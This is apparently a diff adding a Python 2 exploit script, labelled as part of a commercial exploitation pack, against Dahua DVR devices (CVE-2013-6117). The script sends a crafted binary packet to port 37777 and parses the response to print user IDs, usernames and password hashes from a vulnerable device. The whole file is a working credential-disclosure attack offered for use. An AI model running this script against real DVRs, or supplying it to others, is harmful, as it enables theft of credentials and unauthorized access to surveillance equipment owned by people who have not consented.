@@ -1,0 +1,48 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import socket
+
+_name_   = 'd2sec_dahua_1'
+_vendor_ = 'dahua'
+_model_  = ['DVR']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = 'CVE-2013-6117'
+_ref_    = 'https://depthsecurity.com/blog/dahua-dvr-authentication-bypass-cve-2013-6117'
+_port_   = 37777
+
+                               
+def pwnrouter(host,port=_port_):
+  a = [0xa6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+       0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]  
+
+  try:    
+    s = socket.socket()
+    s.settimeout(3)
+    s.connect((host, port))    
+    s.send(bytearray(a))
+    d = bytearray(s.recv(2048))
+    m = re.findall("(\\d:[^:]+:[^:]+):.+?&&", d)
+    if m is not None:
+      print '[+] %s vulnerable\n' % host 
+      print "ID:User:Hash"
+      for n in m:
+        print n    
+  except Exception, e:
+    print '[-] error : %s' % e
+      
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
